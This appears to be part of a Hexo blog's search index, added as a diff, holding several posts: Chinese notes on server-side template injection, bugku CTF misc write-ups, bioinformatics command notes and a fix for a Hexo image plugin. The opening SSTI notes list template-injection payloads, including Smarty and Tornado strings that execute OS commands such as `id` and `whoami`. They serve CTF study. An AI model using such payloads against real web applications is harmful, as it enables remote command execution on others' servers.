+<li><p>Java</p>
+<ul>
+<li><code>$&#123;77&#125;</code></li>
+</ul>
+</li>
+<li><p>Twig</p>
+<ul>
+<li><code>&#123;&#123;77&#125;&#125;</code></li>
+</ul>
+</li>
+<li><p>Smarty</p>
+<ul>
+<li><code>&#123;php&#125;echo `id`;&#123;php&#125;</code></li>
+</ul>
+</li>
+<li><p>AngularJS</p>
+<ul>
+<li><code>$eval(&#39;1+1&#39;)</code></li>
+</ul>
+</li>
+<li><p>Tornado</p>
+<ul>
+<li>引用模块 <code>&#123;% import module %&#125;</code></li>
+<li>&#x3D; <code>&#123;% import os %&#125;&#123;&#123; os.popen(whoami).read() &#125;&#125;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="class-和-name"><a href="#class-和-name" class="headerlink" title="__class__和__name__"></a><code>__class__</code>和<code>__name__</code></h3><p>实例对象调用<code>__class__</code>时会指向该实例的类，<code>__name__</code>可用来获取类名。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; class TEST():</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...             <span class="built_in">print</span>(self.__class__)</span><br><span class="line">...             <span class="built_in">print</span>(self.__class__.__name__)</span><br><span class="line">&gt;&gt;&gt; a = TEST()</span><br><span class="line">&lt;class <span class="string">&#x27;__main__.TEST&#x27;</span>&gt;</span><br><span class="line">TEST</span><br><span class="line">&gt;&gt;&gt; a = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(a.__class__)</span><br><span class="line">&lt;class <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(a.__class__.__name__)</span><br><span class="line">str</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Web</tag>
+        <tag>Chinese</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>easy_nbt</title>
+    <url>/2023/11/06/c93f66235392/</url>
+    <content><![CDATA[<h1 id="easy-nbt-bugku-challenge"><a href="#easy-nbt-bugku-challenge" class="headerlink" title="easy_nbt - bugku challenge"></a>easy_nbt - <a href="https://ctf.bugku.com/">bugku</a> challenge</h1><h2 id="Basic-Information-about-the-challenge"><a href="#Basic-Information-about-the-challenge" class="headerlink" title="Basic Information about the challenge"></a>Basic Information about the challenge</h2><ul>
+<li>link: <a href="https://ctf.bugku.com/challenges/detail/id/217.html">https://ctf.bugku.com/challenges/detail/id/217.html</a></li>
+<li>Title: easy_nbt</li>
+<li>detail: easy_nbt<span id="more"></span></li>
+</ul>
+<h2 id="Solving-process"><a href="#Solving-process" class="headerlink" title="Solving process"></a>Solving process</h2><p>In this challenge, we got a file named ‘file.zip’, whose content is as follows:</p>
+<p><img src="/2023/11/06/c93f66235392/image-20231107004843136.png" alt="image-20231107004843136"></p>
+<p>Reminding of the challenge title, we google ‘what is nbt’ and get this:</p>
+<blockquote>
+<p><img src="/2023/11/06/c93f66235392/image-20231107005526565.png" alt="image-20231107005526565"></p>
+<p>source: <a href="https://wiki.vg/NBT">https://wiki.vg/NBT</a></p>
+</blockquote>
+<p>So firstly we use binwalk to check <code>level.dat</code> and find:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ binwalk level.dat</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             gzip compressed data, from FAT filesystem (MS-DOS, OS/2, NT), last modified: 1970-01-01 00:00:00 (null <span class="built_in">date</span>)</span><br></pre></td></tr></table></figure>
+
+<p>This file is a gzip!</p>
+<p>Change it to a <code>.zip</code>, unzip it and find a file named <code>level</code> .</p>
+<p>Open it with a text editor and search flag.</p>
+<p>Finally get it!!!😀</p>
+<p><img src="/2023/11/06/c93f66235392/image-20231107010235628.png" alt="image-20231107010235628"></p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><h3 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h3><p>Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images.</p>
+<p>Here is the repository. <a href="https://github.com/ReFirmLabs/binwalk">https://github.com/ReFirmLabs/binwalk</a></p>
+<h3 id="NBT"><a href="#NBT" class="headerlink" title="NBT"></a>NBT</h3><p>The Named Binary Tag (NBT) file format is an extremely simple and efficient structured binary format used by the <a href="http://www.minecraft.net/">Minecraft</a> game for a variety of things.</p>
+<p>Here is wiki of NBT. <a href="https://wiki.vg/NBT">https://wiki.vg/NBT</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>English</tag>
+        <tag>Misc</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World test</title>
+    <url>/2022/08/31/96395938436e/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<span id="more"></span>
+
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+      <categories>
+        <category>Helloworld</category>
+      </categories>
+      <tags>
+        <tag>Helloworld!</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Extracting and plotting accuracy of single base and polyT(A)</title>
+    <url>/2025/04/18/c5c6f435f563/</url>
+    <content><![CDATA[<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>When I trained a new model using bonito, remora or the others, the validation loss and accuracy are great indicators indeed. However, I am wandering what the single base and polyT(A) accuracy are like.</p>
+<p>From <a href="https://www.nature.com/articles/s41467-023-41729-1">Gimpel, A.L., Stark, W.J., Heckel, R. et al.</a>, it is known that errors are always biased in the entire DNA storage process. In addition, I am curious about the extent of this bias.</p>
+<span id="more"></span>
+<h2 id="Basecalling"><a href="#Basecalling" class="headerlink" title="Basecalling"></a>Basecalling</h2><p>Here I use <a href="https://github.com/nanoporetech/bonito">bonito</a> to basecall and <code>ZymoBIOMICS HMW DNA Standard</code> as dataset (which is from <a href="https://www.ebi.ac.uk/ena/browser/view/PRJEB64570">PRJEB64570</a>)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bonito basecaller dna_r10.4.1_e8.2_400bps_hac@v5.0.0 ./pod5 &gt; ./basecalls/sample_250410_e8.2_400bps_hac.fastq</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>to be done …</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Tech</category>
+      </categories>
+      <tags>
+        <tag>Bioinformatics</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Extract mutations and INDEL error rates from next-generation sequencing results</title>
+    <url>/2023/12/28/99f91960301d/</url>
+    <content><![CDATA[<h2 id="Alignment"><a href="#Alignment" class="headerlink" title="Alignment"></a>Alignment</h2><p>Ensure there is <code>bwa</code> in the environment. If not, install using this:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lh3/bwa.git</span><br><span class="line"><span class="built_in">cd</span> bwa</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install bwa</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>Ensure there are reference in <code>.fasta</code> and reads_R1 &amp; reads_R2 in <code>.fastq</code> or <code>.fq</code>.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Create Index Files</span></span><br><span class="line">bwa index reference.fasta </span><br><span class="line"></span><br><span class="line">bwa mem reference.fasta reads_R1.fq reads_R2.fq &gt; aln-pe.sam </span><br></pre></td></tr></table></figure>
+
+<h2 id="Follow-up-processing"><a href="#Follow-up-processing" class="headerlink" title="Follow-up processing"></a>Follow-up processing</h2><p>Ensure there are <code>samtools</code> and <code>bcftools</code> in the environment. If not, install using this:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install samtools</span><br><span class="line">sudo apt install bcftools</span><br></pre></td></tr></table></figure>
+
+<p>then use <code>samtools</code>,</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Convert SAM to BAM</span></span><br><span class="line">samtools view -Sb aln-pe.sam &gt; aln-pe.bam</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sort BAM file</span></span><br><span class="line">samtools <span class="built_in">sort</span> aln-pe.bam -o aln-pe.sorted.bam</span><br><span class="line"></span><br><span class="line"><span class="comment"># Index BAM file</span></span><br><span class="line">samtools index aln-pe.sorted.bam</span><br><span class="line"></span><br><span class="line"><span class="comment"># .mpileup contains information about each locus</span></span><br><span class="line">samtools mpileup -f reference.fasta aln-pe.sorted.bam &gt; aln-pe.mpileup</span><br></pre></td></tr></table></figure>
+
+<p>and use <code>bcftools</code> to process <code>.mpileup</code> file and call mutations.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bcftools mpileup -f reference.fasta aln-pe.sorted.bam | bcftools call -<span class="built_in">mv</span> -Ov &gt; variants.vcf</span><br></pre></td></tr></table></figure>
+
+<h3 id="Error-rate-calculating"><a href="#Error-rate-calculating" class="headerlink" title="Error rate calculating"></a>Error rate calculating</h3>]]></content>
+      <categories>
+        <category>Tech</category>
+      </categories>
+      <tags>
+        <tag>Bioinformatics</tag>
+        <tag>English</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Typora+hexo+GithubActions</title>
+    <url>/2023/11/06/0e69a46d245f/</url>
+    <content><![CDATA[<hr>
+<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>在使用Typora编写文章，并通过GithubAction自动生成部署时，发现插入图片路径转义上出现了问题。</p>
+<p>我使用的是<code>hexo install hexo-asset-image --save</code>，但该插件早已achieved，所以需要修改部分逻辑。</p>
+<h2 id="相关版本"><a href="#相关版本" class="headerlink" title="相关版本"></a>相关版本</h2><table>
+<thead>
+<tr>
+<th>环境</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>hexo</td>
+<td>6.2.0</td>
+</tr>
+<tr>
+<td>hexo-cli</td>
+<td>4.3.1</td>
+</tr>
+</tbody></table>
+<span id="more"></span>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>观察log可以发现，图片路径发生了错误的转义：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">INFO  Generated: categories [Helloworld] <span class="keyword">for</span> post [<span class="built_in">source</span>/_posts/hello-world.md][ Hello World <span class="built_in">test</span> ]</span><br><span class="line">update <span class="built_in">link</span> as:--&gt;/.com//image-20231105014117763.png</span><br><span class="line">update <span class="built_in">link</span> as:--&gt;/.com//image-20231105014126054.png</span><br><span class="line">update <span class="built_in">link</span> as:--&gt;/.com//image-20231105014134737.png</span><br><span class="line">update <span class="built_in">link</span> as:--&gt;/.com//image-20231105014117763.png</span><br><span class="line">update <span class="built_in">link</span> as:--&gt;/.com//image-20231105014126054.png</span><br><span class="line">update <span class="built_in">link</span> as:--&gt;/.com//image-20231105014134737.png</span><br></pre></td></tr></table></figure>
+
+<p>image前错误地加上了<code>/.com//</code>，这是期望之外的。</p>
+<p><code>hexo-asset-image.js</code>如下所示：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> cheerio = <span class="built_in">require</span>(<span class="string">&#x27;cheerio&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPosition</span>(<span class="params">str, m, i</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> str.<span class="title function_">split</span>(m, i).<span class="title function_">join</span>(m).<span class="property">length</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&#x27;after_post_render&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> config = hexo.<span class="property">config</span>;</span><br><span class="line">  <span class="keyword">if</span>(config.<span class="property">post_asset_folder</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> link = data.<span class="property">permalink</span>;</span><br><span class="line">    <span class="keyword">var</span> beginPos = <span class="title function_">getPosition</span>(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> appendLink = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class="line">    <span class="comment">// if not with index.html endpos = link.lastIndexOf(&#x27;.&#x27;) + 1 support hexo-abbrlink</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="regexp">/.*\/index\.html$/</span>.<span class="title function_">test</span>(link)) &#123;</span><br><span class="line">      <span class="comment">// when permalink is end with index.html, for example 2019/02/20/xxtitle/index.html</span></span><br><span class="line">      <span class="comment">// image in xxtitle/ will go to xxtitle/index/</span></span><br><span class="line">      appendLink = <span class="string">&#x27;index/&#x27;</span>;</span><br><span class="line">      <span class="keyword">var</span> endPos = link.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> endPos = link.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    link = link.<span class="title function_">substring</span>(beginPos, endPos) + <span class="string">&#x27;/&#x27;</span> + appendLink;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toprocess = [<span class="string">&#x27;excerpt&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; toprocess.<span class="property">length</span>; i++)&#123;</span><br><span class="line">      <span class="keyword">var</span> key = toprocess[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> $ = cheerio.<span class="title function_">load</span>(data[key], &#123;</span><br><span class="line">        <span class="attr">ignoreWhitespace</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">xmlMode</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">lowerCaseTags</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">decodeEntities</span>: <span class="literal">false</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(<span class="string">&#x27;img&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>))&#123;</span><br><span class="line">          <span class="comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span></span><br><span class="line">          <span class="keyword">var</span> src = $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">          <span class="keyword">if</span>(!(<span class="regexp">/http[s]*.*|\/\/.*/</span>.<span class="title function_">test</span>(src)</span><br><span class="line">            || <span class="regexp">/^\s+\//</span>.<span class="title function_">test</span>(src)</span><br><span class="line">            || <span class="regexp">/^\s*\/uploads|images\//</span>.<span class="title function_">test</span>(src))) &#123;</span><br><span class="line">            <span class="comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class="line">            <span class="comment">// In addition, to support multi-level local directory.</span></span><br><span class="line">            <span class="keyword">var</span> linkArray = link.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">elem</span>)&#123;</span><br><span class="line">              <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">var</span> srcArray = src.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">elem</span>)&#123;</span><br><span class="line">              <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">if</span>(srcArray.<span class="property">length</span> &gt; <span class="number">1</span>)</span><br><span class="line">            srcArray.<span class="title function_">shift</span>();</span><br><span class="line">            src = srcArray.<span class="title function_">join</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>, config.<span class="property">root</span> + link + src);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;update link as:--&gt;&quot;</span>+config.<span class="property">root</span> + link + src);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;no src attr, skipped...&quot;</span>);</span><br><span class="line">          <span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>($(<span class="variable language_">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] = $.<span class="title function_">html</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其中</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>, config.<span class="property">root</span> + link + src);</span><br><span class="line"><span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;update link as:--&gt;&quot;</span>+config.<span class="property">root</span> + link + src);</span><br></pre></td></tr></table></figure>
+
+<p>修改为</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>, src);</span><br><span class="line"><span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;update link as:--&gt;&quot;</span>+ src);</span><br></pre></td></tr></table></figure>
+
+<p>并另存为<code>hexo-asset-image-fix.js</code>，放至<code>/source</code>下（我是这么干的，其他地方不知是否可行）。</p>
+<p>在<code>/.github/workflows/deploy.yml</code>中<strong>安装Hexo</strong>这一步中加入</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">Hexo</span></span><br><span class="line">  <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    npm install hexo-cli -g</span></span><br><span class="line"><span class="string">    npm install</span></span><br><span class="line"><span class="string">    cat source/hexo-asset-image-fix.js &gt; node_modules/hexo-asset-image/index.js</span></span><br></pre></td></tr></table></figure>
+
+<p>即可成功显示。</p>
+<h1 id="新的问题-2023-11-07"><a href="#新的问题-2023-11-07" class="headerlink" title="新的问题 2023-11-07"></a>新的问题 2023-11-07</h1><p>需注意，路径中不能有空格。⚠</p>
+]]></content>
+      <categories>
+        <category>Study</category>
+      </categories>
+      <tags>
+        <tag>Chinese</tag>
+        <tag>Github</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>眼见非实 @ bugku</title>
+    <url>/2023/11/07/9448428d7dfd/</url>
+    <content><![CDATA[<h1 id="眼见非实-bugku-challenge"><a href="#眼见非实-bugku-challenge" class="headerlink" title="眼见非实  - bugku challenge"></a>眼见非实  - <a href="https://ctf.bugku.com/">bugku</a> challenge</h1><h2 id="Basic-Information-about-the-challenge"><a href="#Basic-Information-about-the-challenge" class="headerlink" title="Basic Information about the challenge"></a>Basic Information about the challenge</h2><ul>
+<li>link: <a href="https://ctf.bugku.com/challenges/detail/id/5.html">https://ctf.bugku.com/challenges/detail/id/5.html</a></li>
+<li>Title: 眼见非实</li>
+<li>detail: flag{}<span id="more"></span></li>
+</ul>
+<h2 id="Solving-process"><a href="#Solving-process" class="headerlink" title="Solving process"></a>Solving process</h2><p>In this challenge, we got a file named ‘眼见非实.docx’, but it cannot be opened:</p>
+<p><img src="/2023/11/07/9448428d7dfd/image-20231108002948962.png" alt="image-20231108002948962"></p>
+<p>Using Winhex to check its header, we find it a docx indeed.</p>
+<p><img src="/2023/11/07/9448428d7dfd/image-20231108003120717.png" alt="image-20231108003120717"></p>
+<p>Using Notepad to observe the content, find that this docx may contain multiple xml files and have a tree structure.</p>
+<p><img src="/2023/11/07/9448428d7dfd/image-20231108003444236.png" alt="image-20231108003444236"></p>
+<p>So we change <code>眼见非实.docx</code> to <code>眼见非实.zip</code> and unzip it.</p>
+<p><img src="/2023/11/07/9448428d7dfd/image-20231108003600701.png" alt="image-20231108003600701"></p>
+<p>Finally we can get the flag <code>flag&#123;fl@g&#125;</code>  :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep -r <span class="string">&#x27;flag&#x27;</span> ./</span><br><span class="line">./word/document.xml:&lt;w:document xmlns:wpc=<span class="string">&quot;http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas&quot;</span> xmlns:mc=<span class="string">&quot;http://schemas.openxmlformats.org/markup-compatibility/2006&quot;</span> xmlns:o=<span class="string">&quot;urn:schemas-microsoft-com:office:office&quot;</span> xmlns:r=<span class="string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships&quot;</span> xmlns:m=<span class="string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/math&quot;</span> xmlns:v=<span class="string">&quot;urn:schemas-microsoft-com:vml&quot;</span> xmlns:wp14=<span class="string">&quot;http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing&quot;</span> xmlns:wp=<span class="string">&quot;http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing&quot;</span> xmlns:w10=<span class="string">&quot;urn:schemas-microsoft-com:office:word&quot;</span> xmlns:w=<span class="string">&quot;http://schemas.openxmlformats.org/wordprocessingml/2006/main&quot;</span> xmlns:w14=<span class="string">&quot;http://schemas.microsoft.com/office/word/2010/wordml&quot;</span> xmlns:w15=<span class="string">&quot;http://schemas.microsoft.com/office/word/2012/wordml&quot;</span> xmlns:wpg=<span class="string">&quot;http://schemas.microsoft.com/office/word/2010/wordprocessingGroup&quot;</span> xmlns:wpi=<span class="string">&quot;http://schemas.microsoft.com/office/word/2010/wordprocessingInk&quot;</span> xmlns:wne=<span class="string">&quot;http://schemas.microsoft.com/office/word/2006/wordml&quot;</span> xmlns:wps=<span class="string">&quot;http://schemas.microsoft.com/office/word/2010/wordprocessingShape&quot;</span> mc:Ignorable=<span class="string">&quot;w14 w15 wp14&quot;</span>&gt;&lt;w:body&gt;&lt;w:p w:rsidR=<span class="string">&quot;002B3D8D&quot;</span> w:rsidRDefault=<span class="string">&quot;002B3D8D&quot;</span>&gt;&lt;w:r&gt;&lt;w:t&gt;Flag&lt;/w:t&gt;&lt;/w:r&gt;&lt;w:r&gt;&lt;w:t&gt;在这里呦！&lt;/w:t&gt;&lt;/w:r&gt;&lt;/w:p&gt;&lt;w:p w:rsidR=<span class="string">&quot;002B3D8D&quot;</span> w:rsidRPr=<span class="string">&quot;002B3D8D&quot;</span> w:rsidRDefault=<span class="string">&quot;002B3D8D&quot;</span>&gt;&lt;w:pPr&gt;&lt;w:rPr&gt;&lt;w:rFonts w:hint=<span class="string">&quot;eastAsia&quot;</span>/&gt;&lt;w:vanish/&gt;&lt;/w:rPr&gt;&lt;/w:pPr&gt;&lt;w:r w:rsidRPr=<span class="string">&quot;002B3D8D&quot;</span>&gt;&lt;w:rPr&gt;&lt;w:vanish/&gt;&lt;/w:rPr&gt;&lt;w:t&gt;flag&#123;F1@g&#125;&lt;/w:t&gt;&lt;/w:r&gt;&lt;w:bookmarkStart w:<span class="built_in">id</span>=<span class="string">&quot;0&quot;</span> w:name=<span class="string">&quot;_GoBack&quot;</span>/&gt;&lt;w:bookmarkEnd w:<span class="built_in">id</span>=<span class="string">&quot;0&quot;</span>/&gt;&lt;/w:p&gt;&lt;w:sectPr w:rsidR=<span class="string">&quot;002B3D8D&quot;</span> w:rsidRPr=<span class="string">&quot;002B3D8D&quot;</span>&gt;&lt;w:pgSz w:w=<span class="string">&quot;11906&quot;</span> w:h=<span class="string">&quot;16838&quot;</span>/&gt;&lt;w:pgMar w:top=<span class="string">&quot;1440&quot;</span> w:right=<span class="string">&quot;1800&quot;</span> w:bottom=<span class="string">&quot;1440&quot;</span> w:left=<span class="string">&quot;1800&quot;</span> w:header=<span class="string">&quot;851&quot;</span> w:footer=<span class="string">&quot;992&quot;</span> w:gutter=<span class="string">&quot;0&quot;</span>/&gt;&lt;w:cols w:space=<span class="string">&quot;425&quot;</span>/&gt;&lt;w:docGrid w:<span class="built_in">type</span>=<span class="string">&quot;lines&quot;</span> w:linePitch=<span class="string">&quot;312&quot;</span>/&gt;&lt;/w:sectPr&gt;&lt;/w:body&gt;&lt;/w:document&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>English</tag>
+        <tag>Misc</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+</search>
